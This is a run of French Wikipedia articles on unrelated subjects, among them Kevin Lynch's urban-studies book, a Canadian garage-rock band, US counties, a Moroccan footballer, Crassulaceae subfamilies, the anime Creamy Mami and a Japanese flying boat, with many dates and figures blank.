"L'Image de la cité" (), publié en 1960, est le résultat d'une étude de codirigée par Kevin Lynch et menée avec David Crane, Bernard Frieden, William Alonso, Franck Hotchkiss, Richard Dober et Mary Ellen Peters au centre d'études urbaines et régionales du MIT sur la façon dont les utilisateurs perçoivent et organisent l'information spatiale alors qu'ils se déplacent dans une ville.
À partir de trois exemples de villes américaines (Boston, Jersey City, et Los Angeles), il examine en s'attachant sur la lisibilité du paysage urbain, comprise comme la capacité d'en reconnaître les éléments caractéristique et de les organiser en un schéma cohérent. Ceux-ci sont l'image de la cité se répartissant selon les types formels suivants :
Dans ce livre, Kevin Lynch introduit également les notions de () et d' (). "L'Image de la cité" a eu une influence importante et durable dans les domaines de la planification urbaine et de la psychologie environnementale. Pour Lynch, des relations se tissent entre les éléments et les êtres humains, ce qui donne "l'imaginibilité" de la ville. La ville est alors organisée par des images produites, on se trouve dans le performatif.

</doc>
<doc id="1873069" url="https://fr.wikipedia.org/wiki?curid=1873069" title="The Operation M.D.">
The Operation M.D.

The Operation M.D., anciennement The Operation, est un groupe de garage rock canadien, originaire d'Ajax, en Ontario, et Los Angeles, aux États-Unis. Il est formé en 2006 par Todd Morse (alias Dr. Rocco), guitariste des groupes Juliette and the Licks et H2O, et par Jason McCaslin, bassiste du groupe Sum 41. Il s'agit d'un projet en parallèle de leurs groupes respectifs. Le premier album du groupe, "We Have An Emergency", est sorti le , et "Birds + Bee Stings", second album du duo, est sorti le .
Biographie.
Todd Morse et Jason McCaslin se sont rencontrés en 2001 sur le Warped Tour auquel participaient H2O et Sum 41. Ils et se sont rapidement liés d'amitié et ont décidé de former un groupe sur le thème de la médecine. Le groupe a eu succès modéré, excepté au Canada. En effet, le fait que Jason McCaslin soit le bassiste de Sum 41, groupe canadien d'envergure internationale, a poussé les fans de ce groupe à écouter ce projet parallèle. The Operation M.D. reste cependant peu connu et peu reconnu, "We Have an Emergency", n'ayant été distribué qu'au Canada et au Japon.
L'enregistrement de leur deuxième album démarre en . Il est enregistré aux Johnny Land Studios et au Cone's à Toronto, Ontario, ainsi que dans un studio abandonné situé à Ajax, surnommé par le groupe Boehlke's Bunkhouse. Les enregistrements s'achèvent le , et il est mixé et masterisé en .
Le , le groupe publie le morceau "We Stand" sur Myspace. Il s'agit d'un single enregistré pour la compilation à but caritatif "Song for Africa - Rwanda: Rises Up!" qui est publiée le . Le premier single du deuxième album, "Buried at Sea", qui est produit par Ian D'sa de Billy Talent (le reste de l'album étant produit par Cone + Todd) est publié le , avec l'album "Birds + Bee Stings" qui est publié quelques semaines plus tard le . Le , le groupe annonce la réédition de l'album "Birds + Bee Stings" en CD physique au Canada le . Il est soutenu par un concert à la Horseshoe Tavern de Toronto, Ontario, Canada, le .
Le , ils annoncent le tournage d'un nouveau clip. Le , Todd Morse révèle une possible tournée européenne avec possiblement Tom Thacker de Sum 41 et Gob à la guitare. Morse confirme un futur single avec le groupe, "Like Everyone Else", pour Noël.

</doc>
<doc id="1873071" url="https://fr.wikipedia.org/wiki?curid=1873071" title="Comté de Hunt">
Comté de Hunt

Le comté de Hunt, en "", est un comté situé dans le nord-est de l'État du Texas aux États-Unis. Il est nommé en l'honneur de , le secrétaire de la marine de la république du Texas. Le siège du comté est la ville de Greenville. Selon le recensement de 2020, sa population est de . 
Le comté a une superficie de , dont en surfaces terrestres.

</doc>
<doc id="1873072" url="https://fr.wikipedia.org/wiki?curid=1873072" title="Mounir Obbadi">
Mounir Obbadi

Mounir Obbadi, né le à Meulan-en-Yvelines, est un footballeur international marocain qui évolue au poste de milieu de terrain.
Biographie.
En club.
Mounir Obbadi grandit en banlieue parisienne à Chanteloup-les-Vignes. Formé au Paris Saint-Germain, il devient un cadre de l'équipe réserve d'Antoine Kombouaré avec laquelle il est champion du groupe A de CFA en 2003, mais n'évolue jamais sous les couleurs parisiennes avec l'équipe première.
Il est alors prêté six mois à Angers SCO avant d'y signer définitivement. En , il rejoint le club de Ligue 1 de l'ES Troyes AC. En , il retourne chercher du temps de jeu à Angers via un prêt de six mois au cours duquel il aide le club à monter en Ligue 2, avant de réintégrer les rangs de l'ESTAC relégué en Ligue 2.
Après son prêt, il progresse beaucoup et il se fait petit à petit une place de titulaire indiscutable à Troyes, où il effectue une saison pleine en 2011-2012, permettant à son club de retrouver l'élite du football français. Les supporters troyens gardent en mémoire son but contre l'AS Monaco lors de l'avant dernière journée de Ligue 2 (victoire 0-2) qui envoie son club en Ligue 1. Obbadi est un habitué des montées : le Marocain a obtenu quatre accessions avec trois équipes différentes.
Meneur de jeu de l'équipe, il effectue des débuts prometteurs parmi l'élite, malgré un faible nombre de points qui ne reflète pas le niveau de jeu de son équipe.Le , il rejoint le club de l'AS Monaco, pensionnaire de deuxième division. Il s'impose en Principauté comme un élément majeur de la montée en Ligue 1, étant même élu dans l'équipe-type UNFP de la saison.
Malgré l'arrivée à l'intersaison de Geoffrey Kondogbia, il conserve toute la confiance de Claudio Ranieri qui le titularise constamment au poste de milieu défensif. Il ouvre son compteur but avec l'AS Monaco en Ligue 1 le 27 octobre 2013, lors de la de championnat d'une superbe frappe de l'extérieur, à la réception d'un corner mal repoussé par la défense de l'Olympique lyonnais qui finit en lucarne. Lors de la de Ligue 1, il inscrit son deuxième but de la saison à la de jeu puis il va libérer Monaco par la suite puisqu'ils vont s'imposer 1-0 à Nantes et donc vont renouer avec le succès qu'ils avaient perdu depuis 3 matchs. Le , il inscrit son troisième but de la saison face au Lille OSC, idéalement servi par Valère Germain dès la . L'ASM obtient finalement le match nul (1-1) et conserve son avance de neuf points sur son adversaire du soir à huit journées de la fin.
Craignant de manquer de temps de jeu et souhaitant tenter une expérience à l'étranger, il est prêté pour une saison avec option d'achat au Hellas Vérone le . Non conservé par la formation italienne, il change à nouveau de club et signe un contrat de deux ans avec Lille le . Il marque son premier but sous le maillot lillois le lors de la réception de son ancien club, l'AS Monaco (victoire 4-1). Il quitte Lille pour l'OGC Nice le à la suite de difficultés sportives, cinq apparitions sur la première partie de saison, et personnelles, victime d'un home-jacking dans le Nord.
Le , Mounir Obbadi s'engage en faveur du Raja Club Athletic, y paraphant un contrat de six mois.
Le , il s'engage en faveur du Stade lavallois FC, avec un contrat d'un an. Il avait déjà intéressé le club en 2009, lorsque l'ESTAC fut relégué en National.
À 36 ans, Mounir Obbadi décide de s’offrir un dernier challenge auprès de l’AS Poissy. Il y rejoint Laurent Fournier, fraîchement nommé entraîneur du club yvelinois pour la saison 2019-2020. C’est également un choix de cœur lui permettant de se rapprocher de Chanteloup-les-Vignes, ville de son enfance. Le 3 juillet 2020, il s'engage avec le Racing Club de France football, en National 3. Il quitte le club en septembre 2020 sans avoir joué un seul match.
En sélection nationale.
En octobre 1998 il participe à un stage à Clairefontaine avec l'équipe de France des moins de 15 ans.
Les bonnes performances de Mounir Obbadi en faveur du SCO Angers ne restent pas inaperçues : Obbadi devient international marocain et fête sa première sélection le lors d'un match amical contre le Cameroun (0-0). Malgré sa bonne progression à Troyes, Obbadi n'est plus appelé pour les Lions de l'Atlas pendant longtemps.
À la suite de ses titularisations surprenantes dans un club aussi grand que l'AS Monaco, Mounir retrouve finalement l'équipe nationale du Maroc, près de huit ans plus tard. Il fait son retour sous le maillot des Lions de l'Atlas à l'occasion d'une victoire contre la Tanzanie (2-1) en .
Reconversion.
En juillet 2021 il est diplômé du brevet d'entraîneur de football (BEF).
Depuis 2021 il est entraîneur adjoint de Stéphane Moreau, dans l'équipe des U17 nationaux du Paris SG.

</doc>
<doc id="1873073" url="https://fr.wikipedia.org/wiki?curid=1873073" title="Comté de Scott (Kansas)">
Comté de Scott (Kansas)

Le comté de Scott est l’un des 105 comtés de l’État du Kansas, aux États-Unis. Fondé le 20 mars 1873, il a été nommé en hommage au général Winfield Scott.
Siège et seule ville : Scott City.

</doc>
<doc id="1873075" url="https://fr.wikipedia.org/wiki?curid=1873075" title="Kalanchoideae">
Kalanchoideae

La sous-famille des Kalanchoideae est une des six sous-familles de la famille des "Crassulaceae" selon la classification classique de Alwin Berger en 1930. Elle se distingue des autres sous-familles par ses fleurs de type 4 (4 sépales, 4 pétales, 8 étamines et 4 carpelles). Par ailleurs, les quatre pétales sont soudés pour former un tube. 
Il est parfois admis par les taxonomistes que le genre "Kalanchoe" est le seul représentant de cette sous-famille, les genres "Bryophyllum" et "Kitchingia" ayant été inclus dans le genre "Kalanchoe" et n'existent plus que sous la forme de sections.
Bien que diverses revisions taxonomiques aient proposé de réduire par étapes le nombre de sous-familles à trois ou deux, l'ancienne classification de Berger est encore utilisée.
Dans la , cette sous-famille n'existe plus, elle est remplacée par la sous-famille "Kalanchoöideae" A.Berger qui comprend les genres "Adromischus", "Kalanchoe", "Tylecodon" et "Cotyledon".

</doc>
<doc id="1873077" url="https://fr.wikipedia.org/wiki?curid=1873077" title="Ahmed Bahaeddine Attia">
Ahmed Bahaeddine Attia

Ahmed Bahaeddine Attia (), né le à Sousse et mort le à Tunis, est un réalisateur et producteur tunisien.
Biographie.
Après des études de lettres à Paris, Ahmed Bahaeddine Attia décroche quelques années plus tard un diplôme de réalisation à Rome. Il devient assistant de 1968 à 1981 sur plusieurs films tels que "Justine", "Rome vend de nouveau César", "La Fille du cheikh" ("Bent el cheikh"), "Les chacals du désert", "Général" ou encore "Nous voilà".
Après la réalisation de quelques films dont certains de commande — "Baba Aoussou", "Villes ouvertes de Tunisie", "La côte de corail" ou "La mémoire des mains" — juge qu'il peut davantage donner et créer en tant que producteur. C'est ainsi qu'il abandonne la réalisation et fonde en 1983 sa société de production : Cinétéléfilms. Deux décennies durant, il produit une quarantaine de films répartis entre courts métrages (15), longs métrages (17), documentaires et séries pour le cinéma et la télévision. Il produit et coproduit aussi bien des films tunisiens que maghrébins, africains ou français.
Entamant sa carrière de producteur en 1986 avec "L'Homme de cendres", premier film de Nouri Bouzid, il poursuit sa carrière avec "Les Sabots en or", "Bezness" et "Tunisiennes" de Bouzid, "Halfaouine, l'enfant des terrasses" de Férid Boughedir. Par la suite, il produit "La guerre du Golfe... et après ?", un film collectif de cinéastes arabes sur la guerre du Golfe, et "Les Silences du palais" de Moufida Tlatli. Il coproduit également "Viva Carthago", première série de dessins animés en association avec des partenaires européens (France, Italie, Belgique, etc.) et arabes (Algérie, Maroc et Liban).
Outre la réalisation et la production, il dirige l'Association des cinéastes tunisiens. Il préside également la Chambre syndicale des producteurs, les Journées cinématographiques de Carthage en 1992 et 1994 de même que des jurys de plusieurs festivals internationaux (Namur, Mons, Istanbul, Saint-Sébastien, etc.). Il donne par ailleurs des conférences dans différentes écoles de cinéma en France dont La Fémis. Il s'active également au plan méditerranéen en tant que président de l'Association internationale de producteurs indépendants de Méditerranée, pour la promotion de l'audiovisuel méditerranéen et, au plan africain, en tant que membre de la Fédération panafricaine des cinéastes.
Mort à l'âge de 61 ans des suites d'un cancer dans une clinique de Tunis, il est inhumé le dans sa ville natale de Sousse.

</doc>
<doc id="1873082" url="https://fr.wikipedia.org/wiki?curid=1873082" title="Comté de Hutchinson (Texas)">
Comté de Hutchinson (Texas)

Le comté de Hutchinson, en "", est un comté situé dans le Panhandle au nord de l'État du Texas aux États-Unis. Le siège du comté est la ville de Stinnett. Selon le recensement de 2020, sa population est de . 
Le comté a une superficie de , dont en surfaces terrestres.

</doc>
<doc id="1873083" url="https://fr.wikipedia.org/wiki?curid=1873083" title="Hiro F-5">
Hiro F-5



</doc>
<doc id="1873084" url="https://fr.wikipedia.org/wiki?curid=1873084" title="Solar Films">
Solar Films

Solar Films Inc. Oy est une des principales entreprises de production cinématographique de Finlande. Elle est basée à Helsinki dans le district de Lauttasaari. Elle a produit depuis sa création en 1993 plusieurs films ayant rencontré un grand succès dans le pays, en particulier "Levottomat". Elle a été engagée dans la production de "Dark Floors" avec en vedette le groupe Lordi et dans la production du film "Imaginaerum" du groupe Nightwish. D'un budget de quatre millions d'euros, record historique pour un film d'horreur finlandais, "Dark Floors" a été distribué dans le monde entier.
Parmi les cinquante films produits pour le cinéma et la télévision, vingt-trois ont remporté un prix national finlandais, et cinq ont eu un succès mondial. On remarque par exemple la montée des marches de Cannes en 2007 de Lordi.
Souvent associé au drame, avec par exemple "Levottomat" ou "Tummien perhosten koti", la Solar Films Inc. a aussi produit et distribué plusieurs courts et longs métrages d'horreur comme "Dark Floors". Le cinéma de genre est en développement en Finlande, jusqu'alors rejeté par le public.
La TeMe ( : "The Theatre and Media Employees in Finland"), une organisation culturelle syndicale finlandaise, leur a récemment attribué une mention spéciale. D'après ce syndicat, Solar Films Inc. est l'une des meilleures compagnie de production. Les employés qualifiés, les salaires élevés, l'atmosphère de sécurité et le respect des normes nationales lui ont valu ce prix.

</doc>
<doc id="1873085" url="https://fr.wikipedia.org/wiki?curid=1873085" title="Chroniques de Man">
Chroniques de Man

Les Chroniques de Man sont un manuscrit du écrit en latin et dont le nom complet est "Chroniques des rois de Man et des Îles" et qui couvre la période allant de l’an 1000 à 1316, correspondant à peu près à la période celto-norroise de l’île de Man. C’est le plus ancien manuscrit consacré à l’époque où l’île de Man existait sous la forme d’un royaume indépendant dont les limites s’étendait jusqu’aux îles Hébrides.
Il serait l’œuvre d’un moine de l’abbaye de Rushen et aurait été entamé aux alentours de 1257. Il est consacré à l’histoire de Man et notamment à la descendance du roi Godred Crovan, roi scandinave créateur du royaume de Man et des Îles.
Revendications mannoises.
Ce manuscrit appartient à la British Library mais des voix s’élèvent sur l’île de Man pour l’acquisition de l’ouvrage par les autorités mannoises. Des journaux et un site mannois incitent notamment à la signature d’une pétition en ce sens. Les "Chroniques de Man" sont actuellement exposées au Manx Museum et sont l’objet d’un prêt jusqu’à .

</doc>
<doc id="1873086" url="https://fr.wikipedia.org/wiki?curid=1873086" title="Saint-Gingolph (homonymie)">
Saint-Gingolph (homonymie)



</doc>
<doc id="1873087" url="https://fr.wikipedia.org/wiki?curid=1873087" title="Cotyledonoideae">
Cotyledonoideae

La sous-famille des Cotyledonoideae est l'une des six sous-familles de la famille des "Crassulaceae" selon la classification classique. 
Elle se distingue des autres sous-familles par ses fleurs de type 5 aux pétales soudés pour former un tube.
Cette sous-famille comprend 7 genres : "Adromischus", "Chiastophyllum", "Cotyledon", "Mucizonia", "Pistorinia", "Tylecodon" et "Umbilicus" tous originaires de l'Ancien Monde.
Dans la , cette sous-famille n'existe plus.

</doc>
<doc id="1873091" url="https://fr.wikipedia.org/wiki?curid=1873091" title="Laboratoire d'analyses médicales">
Laboratoire d'analyses médicales



</doc>
<doc id="1873092" url="https://fr.wikipedia.org/wiki?curid=1873092" title="Brad Watson">
Brad Watson

Brad Watson, né le à Meridian, au Mississippi, et mort le est un écrivain américain.
Biographie.
En 1978, il obtient un diplôme d'anglais de l'université d'État du Mississippi avant de poursuivre ses études en littérature à l'université de l’Alabama.
Après avoir exercé plusieurs métiers dans le milieu de la presse et de la publicité, il retourne à l'université de l’Alabama pour enseigner l'écriture créative. Il se consacre aussi à l'écriture et publie son premier recueil de nouvelles, "Last Days of the Dog Men", en 1996. Son premier roman, "Le Paradis perdu de Mercury" ("The Heaven of Mercury", 2002), est finaliste du National Book Award.
Selon la revue "Lire", il est .

</doc>
<doc id="1873093" url="https://fr.wikipedia.org/wiki?curid=1873093" title="Médecin-biologiste">
Médecin-biologiste

Le terme médecin biologiste s'applique au médecin spécialisé en biologie médicale ou médecine de laboratoire.
Dans les pays anglo-saxons, on l'appelle « "clinical pathologist" ».
Formation.
En France.
Les études de médecine en France permettent entre autres la formation d'un biologiste médical, au bout d'une formation durant dix ans au total. Ce sont des études hospitalo-universitaires, qui comportent six ans de tronc commun avec les études des autres spécialités médicales. Passé cette période, l'étudiant passe les épreuves classantes nationales, puis s'oriente vers le de biologie médicale. L'étudiant devient alors un interne et doit effectuer un cursus de quatre ans associant formation pratique (stage) et théorique (cours). Ces quatre ans sont regroupés en deux parties de deux ans, dites formation de niveau 1 et formation de niveau 2.
Le niveau 1 constitue une formation commune, basée sur les cinq spécialités suivantes de biologie médicale :
Le niveau 2 comporte deux options possibles : biologie polyvalente ou biologie spécialisée. Cette dernière peut concerner :

</doc>
<doc id="1873094" url="https://fr.wikipedia.org/wiki?curid=1873094" title="Gare de Luxé">
Gare de Luxé

La gare de Luxé est une gare ferroviaire française de la ligne de Paris-Austerlitz à Bordeaux-Saint-Jean, située sur le territoire de la commune de Luxé, dans le département de la Charente, en région Nouvelle-Aquitaine.
Cette gare de la Société nationale des chemins de fer français (SNCF) est desservie par des trains régionaux du réseau .
Situation ferroviaire.
La gare est située au point kilométrique (PK) 420,303 de la ligne de Paris-Austerlitz à Bordeaux-Saint-Jean entre les gares ouvertes de Ruffec, au nord, et d'Angoulême, au sud.
Histoire.
La gare de Luxé a été mise en service lors de l'ouverture de la section Poitiers – Angoulême de la ligne Paris – Bordeaux le , par la Compagnie du chemin de fer de Paris à Orléans. Il y avait auparavant une autre gare, située plus au sud, qui appartenait à la Compagnie des chemins de fer économiques des Charentes.
Elle possède une troisième voie, en impasse, qui pourrait être parcourue par un train venant d'Angoulême ; cette dernière est inutilisée.
La base travaux de Villognon qui assure la maintenance de la LGV Sud Europe Atlantique se situe à proximité de la gare.
Fréquentation.
De 2015 à 2023, selon les estimations de la SNCF, la fréquentation annuelle de la gare s'élève aux nombres indiqués dans le tableau ci-dessous:
Service des voyageurs.
Accueil.
Ce point d'arrêt non géré (PANG) est équipé de deux quais avec abris. Le passage d'une voie à l'autre s'effectue par une passerelle.
Desserte.
Luxé est desservie par des trains du réseau TER Nouvelle-Aquitaine (ligne Poitiers – Angoulême). Certains trains poursuivent jusqu’à Châtellerault.
Intermodalité.
Un parking pour les véhicules est présent à proximité.

</doc>
<doc id="1873095" url="https://fr.wikipedia.org/wiki?curid=1873095" title="Histoire Naturelle des Poissons">
Histoire Naturelle des Poissons



</doc>
<doc id="1873097" url="https://fr.wikipedia.org/wiki?curid=1873097" title="Comté de Gove">
Comté de Gove

Le comté de Gove est l’un des 105 comtés de l’État du Kansas, aux États-Unis. Fondé le 11 mars 1868, il a été nommé en hommage au capitaine Grenville L. Gove, mort lors de la guerre de Sécession.
Siège : Gove. Plus grande ville : Quinter.

</doc>
<doc id="1873100" url="https://fr.wikipedia.org/wiki?curid=1873100" title="Bouna">
Bouna

Bouna peut faire référence à :
Algérie
Burkina Faso
Côte d'Ivoire
Tchad

</doc>
<doc id="1873105" url="https://fr.wikipedia.org/wiki?curid=1873105" title="Erik le Viking (film, 1989)">
Erik le Viking (film, 1989)

Erik le Viking ("Erik the Viking") est un film britannique réalisé par Terry Jones, sorti en 1989.
Synopsis.
Après avoir tué une jeune fille dont il était amoureux, Erik prend conscience de la vie des vikings : pillages, viols, meurtres… Pour changer cela, il part avec ses amis à la recherche du cor résonnant, dont le souffle réveillera les dieux et mettra un terme à Ragnarök, le règne de terreur.

</doc>
<doc id="1873106" url="https://fr.wikipedia.org/wiki?curid=1873106" title="Mahō no tenshi Creamy Mami">
Mahō no tenshi Creamy Mami



</doc>
<doc id="1873108" url="https://fr.wikipedia.org/wiki?curid=1873108" title="Pôle de Compétitivité">
Pôle de Compétitivité



</doc>
<doc id="1873110" url="https://fr.wikipedia.org/wiki?curid=1873110" title="Echeverioideae">
Echeverioideae

La sous-famille des Echeverioideae est une des six sous-familles de la famille des "Crassulaceae" selon la classification classique.
Elle regroupe 6 genres originaires du Nouveau Monde : 
Dans la , cette sous-famille n'existe plus et tous ses genres sont reclassés dans la sous-famille des Sempervivoideae.

</doc>
<doc id="1873111" url="https://fr.wikipedia.org/wiki?curid=1873111" title="Menace 2 society">
Menace 2 society



</doc>
<doc id="1873112" url="https://fr.wikipedia.org/wiki?curid=1873112" title="Creamy, merveilleuse Creamy">
Creamy, merveilleuse Creamy

, est une série animée de "magical girl" produite par le Studio Pierrot à partir de 1983.
En France, le dessin-animé a été diffusé à partir du sur La Cinq dans l'émission "Youpi ! L'école est finie" sous le titre "Creamy, merveilleuse Creamy". Rediffusion sous le titre "Creamy, adorable Creamy" à partir du dans Club mini sur TF1. Rediffusion sous le titre "La Petite Etoile Carrée" à partir du sur Boomerang. Rediffusions sous ce nouveau titre sur TMC Monte Carlo et Mangas.
Elle connut trois adaptations en OAV et parut dans d'autres productions spéciales du Studio Pierrot. Un manga en trois volumes, avec un scénario de et des dessins de Yuuko Kitagawa est également sorti pendant la diffusion de la série originale. C'était la première série de "" produite par le Studio Pierrot, et la première à être conçue par Akemi Takada. En 2005, un sondage de TV Asahi sur les séries animées de tous les temps plaça "Mahō no Tenshi Creamy Mami" à la .
L'histoire.
Yū Morisawa est une fillette de ordinaire, jusqu'au jour où elle aperçoit un vaisseau spatial dans le ciel qu'elle est vraisemblablement la seule à voir. Emmenée à l'intérieur, elle fait la connaissance de Pino Pino qu'elle aide à retrouver Feather Star en détruisant un nuage de mauvais rêve dans le vaisseau. Pour la remercier, il lui donne un pendentif renfermant une baguette magique capable de réciter des formules qu'elle pourra utiliser pour une durée d'un an.
Malheureusement, Nega et Poci, les deux chats délégués par Pino Pino pour veiller sur elle et l'aider à utiliser ses pouvoirs magiques pendant le temps qui lui est imparti, n'arrivent à lire qu'une seule formule : celle qui lui permet de se transformer en adolescente de 16 ans. Une seule condition lui est imposée pour utiliser ce pouvoir : le garder secret et faire en sorte que personne ne le découvre.
Alors que Yū, transformée, se promène en ville, elle entre par hasard dans un studio de télévision où on lui propose de chanter en urgence à la place de la chanteuse à succès Megumi Ayase, empêchée dans ses obligations par une congestion du trafic routier. Poussée par la force des choses, elle s'exécute en adoptant le pseudonyme de Creamy Mami. Elle parvient à offrir une prestation magnifique avec l'aide de sa magie
Cela poussera Shingo Tachibana, le président de la maison de disques Parthenon Production, à vouloir en faire une "idol". Ainsi que tout mettre en œuvre pour la retrouver et la convaincre de se lancer dans cette carrière. Il y parviendra quand, en cherchant des témoins de la première apparition de Creamy, il tombe sur Toshio Ōtomo.
Celui-ci, enthousiaste à l'idée de revoir Creamy Mami en tant qu"'idol" et ignorant sa véritable identité, poussera involontairement celle ci à accepter la proposition de Shingo. Il fera d'elle la star principale de Parthenon Productions.
Impact et influence.
"Creamy Mami" est connu pour avoir été un pionnier d'une nouvelle stratégie marketing connue sous le nom de "media mix" ou mélange des médias. La série animée servait à promouvoir une jeune et nouvelle chanteuse. La chanteuse Takako Ohta jouait la chanteuse Creamy Mami dans la série. Le générique de début, "Delicate ni Suki Shite", était sa première chanson. Même s'il s'agissait d'une chanteuse débutante et non d'une vraie "seiyū", elle doubla Yu/Creamy dans la série. Le résultat fut un succès : "Creamy Mami" devint une série culte et Takako Ohta y gagna une grande popularité qui persiste encore aujourd'hui. En 1999, l'émission "Kaishingeki TV Utaemon" de la chaîne Fuji TV organisa un sondage sur la chanson de série animée la plus populaire chez les spectateurs de 25 ans, et "Delicate ni Suki Shite" arriva en . La série a été également diffusée plusieurs fois sur Internet. En , il était possible de voir la série gratuitement en vidéo à la demande sur GyaO.
La stratégie "media mix" a également été utilisée avec des séries comme "Erika" (1989) et "Idol Tenshi Youkoso Yōko" (1990). La version animée de "Full Moon wo sagashite" (2002) repose sur le même principe. On peut également citer "" (1987). L'utilisation d'une série animée pour promouvoir une chanteuse n'était pas nouvelle en soi car une série de ce type, "Pink Lady Monogatari", existait déjà en 1978 ; cependant, Pink Lady était déjà populaire avant la série, et n'a donc pas vraiment été révélée grâce à cette dernière.
"Creamy Mami" fut le précurseur du format utilisé par la suite par Studio Pierrot pour ses futures productions de ', en particulier "Fancy Lala". Creamy Mami apparaît également dans ' avec Magical Emi ("Emi magique") et Pelsia ("Vanessa ou la magie des rêves"), ainsi que dans "Majokko Club Yoningumi A-Kukan Kara no Alien X" avec Magical Emi, Pelsia et Pastel Yumi ("Susy aux fleurs magiques"). La popularité de la série ne s'arrêta pas à deux suites, mais Creamy Mami prit également part à cinq séries de clips, à commencer par l'OAV "Lovely Serenade" en 1985. La seconde de ces deux suites, "", débuta par l'épisode court "Mahō no Tenshi Creamy Mami VS Mahō no Princess Minky Momo Gekijou no Daikessen", où Creamy Mami se bat contre Minky Momo (Gigi) d'Ashi Productions.
Diffusions hors du Japon.
"Magical Angel Creamy Mami" fut doublé en italien par Studio PV, pour être diffusé en Italie à partir du sous le nom de "". Il fut également diffusé en France sous le nom de "Creamy, merveilleuse Creamy" à partir du . C'est lorsque le groupe AB acquit les droits des dessins-animés historiques de La Cinq, que la série s'appela "Creamy, adorable Creamy".
Certains titres de Creamy, interprétés par Takako Ohta dans la version originale, ont été adaptés par Charles Level pour la version française et commercialisés dans l'album Creamy merveilleuse Creamy: Toutes les chansons originales. C'est Claude Lombard, chanteuse de la plupart des génériques des dessins-animés de La Cinq, qui les interprète.
Seuls certains morceaux originaux ont été adaptés en français. Bien que "Derikēto ni Sukini Shite, Pajama no mama de" et "LOVE Sarigenaku," respectivement premier générique de début, premier générique de fin et second générique de fin, en fassent partie sous les titres "On ne peut jamais savoir", "Un ange" et "Rêves", un générique français basé sur la chanson italienne "L'incantevole Creamy" a été réalisé. Il est interprété par Valérie Barouille.
Le générique espagnol est également basé sur la version italienne.
Dans l'épisode 46, une scène de la série fait chanter Creamy sur une version piano de "LOVE Sarigenaku" dans la version originale"." La version française, tout comme son équivalente italienne, ne ré-adapte pas cette partie et utilise la version locale du morceau à la place.

</doc>
<doc id="1873114" url="https://fr.wikipedia.org/wiki?curid=1873114" title="Hiro H1H">
Hiro H1H

Le Hiro Type 15 ou H1H est un hydravion bimoteur de reconnaissance, dérive du Felixstowe F.5. C’est le premier hydravion à coque japonais produit en série.
Origine.
En 1926 la Marine impériale japonaise lança le développement d’un hydravion de grande reconnaissance destiné à remplacer ses Felixstowe F.5 entrés en service cinq ans plus tôt. Le Lt Yoshio Hashiguchi fut chargé de développer cet appareil, qui devait être construit par l’Arsenal naval de Hiro ("Hiro Kaigun Kosho") et intégrer l’expérience acquise avec les F.5 mais aussi des données techniques obtenues chez Short Brothers, en Grande-Bretagne. 
Équipé de deux moteurs Lorraine 1 de 400 ch, le premier prototype fut achevé à l’automne 1927. Il avait une coque en bois très proche de celle du F.5, mais une cellule biplan originale. S’il nécessita quelques modifications, qui seront introduites sur les prototypes suivants, il était globalement stable, facile à piloter et surtout offrait des performances suffisantes pour que la production soit lancée dès 1927 chez Aichi, puis en chez Hiro, donc à la suite de la production sous licence des F.5. 
Production.
Au total 65 appareils ont été construits, dont 45 par Aichi Tokei Denki KK.
Utilisation.
Équipement de base de la Marine impériale japonaise jusqu'au milieu des années 1930, le Type 15 fit preuve de ses qualités quand une formation de 4 appareils [Yo-56, 57, 58 et 59] effectua un raid de dans le Pacifique entre les 20 et : Yokosuka, Chichi-jima (Îles Bonin), Maug (Îles Mariannes), Saipan (Îles Mariannes) et retour. La formation était commandée par les lt. Yoshiaki Itoh et Iwao Minematsu.

</doc>
<doc id="1873115" url="https://fr.wikipedia.org/wiki?curid=1873115" title="Évêque errant">
Évêque errant

Un « évêque errant » (du latin : "episcopus vagans", traduit du grec χωρεπισϰόπος , "khôrépiskopos", "chorévêque") est un évêque ayant reçu la consécration épiscopale mais qui n'est pas en communion avec l'Église catholique, ou une Église orthodoxe canonique, ou encore une Église protestante établie (Église d'Angleterre, Église de Suède). Ces évêques sont dits « errants » parce qu'ils n'ont pas d'évêché attitré.
Cela concerne, par exemple, des évêques catholiques qui ne sont pas en pleine communion avec le Saint-Siège. D'autres « évêques errants » ("episcopi vagantes") ont, eux, préféré rejoindre, voire fonder, des Églises éloignées de Rome, faisant valoir la validité de leur sacrement.
Doctrine catholique.
L'Église catholique accorde la primauté du sacrement sur la communauté et considère qu'une consécration épiscopale suivant un rite canonique et par un évêque ordonné canoniquement est valide "mais illicite". Pour elle, une personne canoniquement consacrée évêque le reste toute sa vie, même si elle n'est plus en communion avec le pape.
En effet, un catholique romain ou oriental ordonné à l'épiscopat sans mandat du pape est automatiquement excommunié et est donc interdit de célébrer les sacrements en vertu du droit canonique. 
Cependant, en vertu du caractère sacramentel de l'épiscopat et du principe "ex opere operato" (« de par l’action opérée »), selon lequel l'efficacité d'un sacrement ne dépend pas des mérites de la personne qui accomplit ou qui reçoit le sacrement, cette ordination est considérée comme "valide mais illicite". Cette doctrine, qui relève de la théologie sacramentelle, affirme que l’efficacité spirituelle d'un sacrement découle de son action même. La grâce divine particulière donnée par un sacrement, et en particulier la présence de l’Esprit-Saint, agissent de façon indépendante.
Cette doctrine est formulée dans le "Catéchisme de l’Église catholique" (1128) : 
Cela signifie que, bien qu'excommunié et interdit d'exercer tout ministère sous l'autorité de l'Église catholique, un évêque ainsi ordonné est considéré comme ayant les pleins pouvoirs sacramentels d'un évêque, y compris celui d'ordonner d'autres évêques.
Doctrine orthodoxe.
Les Églises orthodoxes accordent la primauté à la communauté sur le sacrement, la consécration épiscopale ne peut avoir lieu qu'au sein d'une véritable communauté, une personne ne peut donc être évêque seule.
Aujourd'hui.
Il existe à l'heure actuelle un certain nombre de personnes ayant été consacrées à l'épiscopat et animant des groupes religieux dans la succession apostolique de telle ou telle Église. Beaucoup de ces évêques affirment descendre des sacres d'Arnold Harris Matthew de l'Église vieille-catholique romaine ou de ceux de Joseph-René Vilatte et de l'archevêque catholique vietnamien Pierre Martin Ngo Dinh Thuc.

</doc>
<doc id="1873117" url="https://fr.wikipedia.org/wiki?curid=1873117" title="Gare de Ruffec">
Gare de Ruffec

La gare de Ruffec est une gare ferroviaire française de la ligne de Paris-Austerlitz à Bordeaux-Saint-Jean, située sur le territoire de la commune de Ruffec, dans le département de la Charente, en région Nouvelle-Aquitaine.
Elle est mise en service en 1853, par la Compagnie du chemin de fer de Paris à Orléans.
C'est une gare de la Société nationale des chemins de fer français (SNCF), desservie par des trains régionaux du réseau .
Situation ferroviaire.
